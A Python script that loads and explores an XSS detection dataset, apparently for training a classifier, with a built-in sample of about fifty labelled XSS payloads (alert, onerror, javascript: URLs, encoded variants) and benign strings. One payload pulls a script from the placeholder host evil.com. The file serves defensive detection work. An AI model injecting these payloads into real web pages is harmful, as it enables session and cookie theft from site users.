#!/usr/bin/env python3
"""
Data Loader for XSS Dataset from Kaggle
Dataset: Cross-Site Scripting (XSS) Dataset for Deep Learning
URL: https://www.kaggle.com/datasets/syedsaqlainhussain/cross-site-scripting-xss-dataset-for-deep-learning
"""

import pandas as pd
import numpy as np
import matplotlib.pyplot as plt
import seaborn as sns
from wordcloud import WordCloud
import warnings
warnings.filterwarnings('ignore')

class XSSDataLoader:
    """
    Data loader and preprocessor for XSS dataset
    """
    
    def __init__(self):
        self.data = None
        self.processed_data = None
    
    def load_kaggle_dataset(self, file_path: str) -> pd.DataFrame:
        """
        Load the XSS dataset from Kaggle
        Expected format: CSV with columns like 'Sentence' and 'Label'
        """
        try:
            # Try different common column names that might be in the dataset
            df = pd.read_csv(file_path)
            
            # Display basic info about the dataset
            print(f"Dataset loaded successfully!")
            print(f"Shape: {df.shape}")
            print(f"Columns: {list(df.columns)}")
            
            # Check for common column names and rename if necessary
            if 'Sentence' in df.columns and 'Label' in df.columns:
                print("Dataset has expected column names: 'Sentence' and 'Label'")
            else:
                # Try to identify text and label columns
                text_col = None
                label_col = None
                
                for col in df.columns:
                    if df[col].dtype == 'object' and text_col is None:
                        text_col = col
                    elif df[col].dtype in ['int64', 'float64'] and label_col is None:
                        label_col = col
                
                if text_col and label_col:
                    df = df.rename(columns={text_col: 'Sentence', label_col: 'Label'})
                    print(f"Renamed columns: '{text_col}' -> 'Sentence', '{label_col}' -> 'Label'")
                else:
                    print("Warning: Could not identify text and label columns automatically")
            
            self.data = df
            return df
            
        except Exception as e:
            print(f"Error loading dataset: {e}")
            print("Creating sample dataset for demonstration...")
            return self.create_sample_dataset()
    
    def create_sample_dataset(self) -> pd.DataFrame:
        """
        Create a sample XSS dataset for demonstration
        """
        sample_data = {
            'Sentence': [
                # XSS examples
                '<script>alert("XSS")</script>',
                'javascript:alert(1)',
                '<img src=x onerror=alert(1)>',
                '<iframe src="javascript:alert(1)"></iframe>',
                '<svg onload=alert(1)>',
                '<body onload=alert(1)>',
                '<input onfocus=alert(1) autofocus>',
                '<select onfocus=alert(1) autofocus>',
                '<textarea onfocus=alert(1) autofocus>',
                '<keygen onfocus=alert(1) autofocus>',
                '<video><source onerror="alert(1)">',
                '<audio src=x onerror=alert(1)>',
                '<details open ontoggle=alert(1)>',
                '<marquee onstart=alert(1)>',
                'javascript:void(0)',
                '<script src="http://evil.com/xss.js"></script>',
                '<object data="javascript:alert(1)">',
                '<embed src="javascript:alert(1)">',
                '<applet code="javascript:alert(1)">',
                '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">',
                '<link rel="stylesheet" href="javascript:alert(1)">',
                '<style>@import"javascript:alert(1)";</style>',
                '<div style="background:url(javascript:alert(1))">',
                '<table background="javascript:alert(1)">',
                '<td background="javascript:alert(1)">',
                'document.cookie',
                'window.location',
                'eval(alert(1))',
                'setTimeout(alert(1), 100)',
                'setInterval(alert(1), 100)',
                'String.fromCharCode(97,108,101,114,116,40,49,41)',
                'unescape("%3Cscript%3Ealert(1)%3C/script%3E")',
                'decodeURI("%3Cscript%3Ealert(1)%3C/script%3E")',
                '<script>confirm("XSS")</script>',
                '<script>prompt("XSS")</script>',
                'onload=alert(1)',
                'onerror=alert(1)',
                'onclick=alert(1)',
                'onmouseover=alert(1)',
                'onfocus=alert(1)',
                'onblur=alert(1)',
                'onchange=alert(1)',
                'onsubmit=alert(1)',
                'onreset=alert(1)',
                'onselect=alert(1)',
                'onunload=alert(1)',
                'onbeforeunload=alert(1)',
                'oncontextmenu=alert(1)',
                'ondblclick=alert(1)',
                'ondrag=alert(1)',
                'ondragend=alert(1)',
                
                # Normal text examples
                'Hello world',
                'This is a normal sentence',
                'Regular text content',
                'Just some text',
                'Normal content here',
                'Welcome to our website',
                'Please enter your username',
                'Thank you for visiting',
                'Contact us for more information',
                'Our services are available 24/7',
                'Learn more about our products',
                'Subscribe to our newsletter',
                'Follow us on social media',
                'Read our privacy policy',
                'Terms and conditions apply',
                'Free shipping on orders over $50',
                'Customer satisfaction guaranteed',
                'Quality products at affordable prices',
                'Fast and reliable delivery',
                'Secure payment methods',
                'User-friendly interface',
                'Mobile responsive design',
                'Search functionality',
                'Filter and sort options',
                'Product reviews and ratings',
                'Shopping cart and checkout',
                'User account management',
                'Order tracking system',
                'Customer support chat',
                'FAQ section',
                'Blog and news updates',
                'Photo gallery',
                'Video tutorials',
                'Download section',
                'Registration form',
                'Login page',
                'Password reset',
                'Email verification',
                'Profile settings',
                'Dashboard overview',
                'Analytics and reports',
                'Backup and restore',
                'System maintenance',
                'Software updates',
                'Bug fixes and improvements',
                'Feature requests',
                'User feedback',
                'Performance optimization',
                'Security enhancements',
                'Database management',
                'Server configuration'
            ],
            'Label': [1] * 51 + [0] * 51  # 1 for XSS, 0 for normal
        }
        
        df = pd.DataFrame(sample_data)
        self.data = df
        return df
    
    def explore_dataset(self, df: pd.DataFrame) -> None:
        """
        Perform comprehensive exploratory data analysis
        """
        print("\n" + "="*60)
        print("EXPLORATORY DATA ANALYSIS")
        print("="*60)
        
        # Basic information
        print(f"Dataset Shape: {df.shape}")
        print(f"Columns: {list(df.columns)}")
        print(f"\nData Types:")
        print(df.dtypes)
        
        # Missing values
        print(f"\nMissing Values:")
        missing_values = df.isnull().sum()
        print(missing_values)
        
        # Class distribution
        print(f"\nClass Distribution:")
        class_counts = df['Label'].value_counts()
        print(class_counts)
        
        class_percentages = df['Label'].value_counts(normalize=True) * 100
        print(f"\nClass Distribution (Percentage):")
        print(class_percentages)
        
        # Text statistics
        df['text_length'] = df['Sentence'].str.len()
        df['word_count'] = df['Sentence'].str.split().str.len()
        
        print(f"\nText Statistics:")
        print(f"Average text length: {df['text_length'].mean():.2f}")
        print(f"Average word count: {df['word_count'].mean():.2f}")
        
        # Statistics by class
        print(f"\nText Statistics by Class:")
        for label in df['Label'].unique():
            subset = df[df['Label'] == label]
            label_name = 'XSS' if label == 1 else 'Normal'
            print(f"{label_name}:")
            print(f"  Average text length: {subset['text_length'].mean():.2f}")
            print(f"  Average word count: {subset['word_count'].mean():.2f}")
        
        # Sample data
        print(f"\nSample XSS Examples:")
        xss_samples = df[df['Label'] == 1]['Sentence'].head(5)
        for i, sample in enumerate(xss_samples, 1):
            print(f"{i}. {sample}")
        
        print(f"\nSample Normal Examples:")
        normal_samples = df[df['Label'] == 0]['Sentence'].head(5)
        for i, sample in enumerate(normal_samples, 1):
            print(f"{i}. {sample}")
        
        # Create visualizations
        self.create_visualizations(df)
    
    def create_visualizations(self, df: pd.DataFrame) -> None:
        """
        Create comprehensive visualizations
        """
        plt.style.use('default')
        fig, axes = plt.subplots(2, 3, figsize=(18, 12))
        
        # 1. Class distribution
        class_counts = df['Label'].value_counts()
        labels = ['Normal', 'XSS']
        colors = ['lightblue', 'lightcoral']
        
        axes[0, 0].pie(class_counts.values, labels=labels, colors=colors, autopct='%1.1f%%', startangle=90)
        axes[0, 0].set_title('Class Distribution')
        
        # 2. Text length distribution
        xss_lengths = df[df['Label'] == 1]['text_length']
        normal_lengths = df[df['Label'] == 0]['text_length']
        
        axes[0, 1].hist(normal_lengths, bins=30, alpha=0.7, label='Normal', color='lightblue')
        axes[0, 1].hist(xss_lengths, bins=30, alpha=0.7, label='XSS', color='lightcoral')
        axes[0, 1].set_xlabel('Text Length')
        axes[0, 1].set_ylabel('Frequency')
        axes[0, 1].set_title('Text Length Distribution')
        axes[0, 1].legend()
        
        # 3. Word count distribution
        xss_words = df[df['Label'] == 1]['word_count']
        normal_words = df[df['Label'] == 0]['word_count']
        
        axes[0, 2].hist(normal_words, bins=20, alpha=0.7, label='Normal', color='lightblue')
        axes[0, 2].hist(xss_words, bins=20, alpha=0.7, label='XSS', color='lightcoral')
        axes[0, 2].set_xlabel('Word Count')
        axes[0, 2].set_ylabel('Frequency')
        axes[0, 2].set_title('Word Count Distribution')
        axes[0, 2].legend()
        
        # 4. Box plot for text length by class
        df_melted = df.melt(id_vars=['Label'], value_vars=['text_length'], var_name='Metric', value_name='Value')
        sns.boxplot(data=df_melted, x='Label', y='Value', ax=axes[1, 0])
        axes[1, 0].set_title('Text Length by Class')
        axes[1, 0].set_xlabel('Label (0=Normal, 1=XSS)')
        axes[1, 0].set_ylabel('Text Length')
        
        # 5. Box plot for word count by class
        df_melted_words = df.melt(id_vars=['Label'], value_vars=['word_count'], var_name='Metric', value_name='Value')
        sns.boxplot(data=df_melted_words, x='Label', y='Value', ax=axes[1, 1])
        axes[1, 1].set_title('Word Count by Class')
        axes[1, 1].set_xlabel('Label (0=Normal, 1=XSS)')
        axes[1, 1].set_ylabel('Word Count')
        
        # 6. Character frequency analysis
        xss_text = ' '.join(df[df['Label'] == 1]['Sentence'])
        normal_text = ' '.join(df[df['Label'] == 0]['Sentence'])
        
        special_chars = ['<', '>', '"', "'", '(', ')', '=', ';', ':']
        xss_char_counts = [xss_text.count(char) for char in special_chars]
        normal_char_counts = [normal_text.count(char) for char in special_chars]
        
        x = np.arange(len(special_chars))
        width = 0.35
        
        axes[1, 2].bar(x - width/2, normal_char_counts, width, label='Normal', color='lightblue')
        axes[1, 2].bar(x + width/2, xss_char_counts, width, label='XSS', color='lightcoral')
        axes[1, 2].set_xlabel('Special Characters')
        axes[1, 2].set_ylabel('Frequency')
        axes[1, 2].set_title('Special Character Frequency')
        axes[1, 2].set_xticks(x)
        axes[1, 2].set_xticklabels(special_chars)
        axes[1, 2].legend()
        
        plt.tight_layout()
        plt.savefig('xss_data_analysis.png', dpi=300, bbox_inches='tight')
        plt.show()
        
        # Create word clouds
        self.create_wordclouds(df)
    
    def create_wordclouds(self, df: pd.DataFrame) -> None:
        """
        Create word clouds for XSS and normal text
        """
        fig, axes = plt.subplots(1, 2, figsize=(16, 8))
        
        # XSS word cloud
        xss_text = ' '.join(df[df['Label'] == 1]['Sentence'])
        if xss_text:
            wordcloud_xss = WordCloud(width=800, height=400, background_color='white', 
                                     colormap='Reds', max_words=100).generate(xss_text)
            axes[0].imshow(wordcloud_xss, interpolation='bilinear')
            axes[0].set_title('XSS Text Word Cloud', fontsize=16)
            axes[0].axis('off')
        
        # Normal text word cloud
        normal_text = ' '.join(df[df['Label'] == 0]['Sentence'])
        if normal_text:
            wordcloud_normal = WordCloud(width=800, height=400, background_color='white', 
                                        colormap='Blues', max_words=100).generate(normal_text)
            axes[1].imshow(wordcloud_normal, interpolation='bilinear')
            axes[1].set_title('Normal Text Word Cloud', fontsize=16)
            axes[1].axis('off')
        
        plt.tight_layout()
        plt.savefig('xss_wordclouds.png', dpi=300, bbox_inches='tight')
        plt.show()
    
    def get_processed_data(self) -> pd.DataFrame:
        """
        Return the processed dataset
        """
        return self.data
    
    def save_processed_data(self, filename: str = 'processed_xss_data.csv') -> None:
        """
        Save the processed dataset
        """
        if self.data is not None:
            self.data.to_csv(filename, index=False)
            print(f"Processed data saved to {filename}")
        else:
            print("No data to save. Please load data first.")

def main():
    """
    Main function to demonstrate data loading and exploration
    """
    print("XSS Dataset Loader and Explorer")
    print("="*50)
    
    # Initialize data loader
    loader = XSSDataLoader()
    
    # Try to load the dataset
    # Replace 'path_to_dataset.csv' with the actual path to your Kaggle dataset
    # df = loader.load_kaggle_dataset('path_to_dataset.csv')
    
    # For demonstration, use sample data
    df = loader.create_sample_dataset()
    
    # Explore the dataset
    loader.explore_dataset(df)
    
    # Save processed data
    loader.save_processed_data()
    
    print("\nData loading and exploration completed!")
    print("You can now use this data with the XSSDetector class in xss_detection.py")

if __name__ == "__main__":
    main()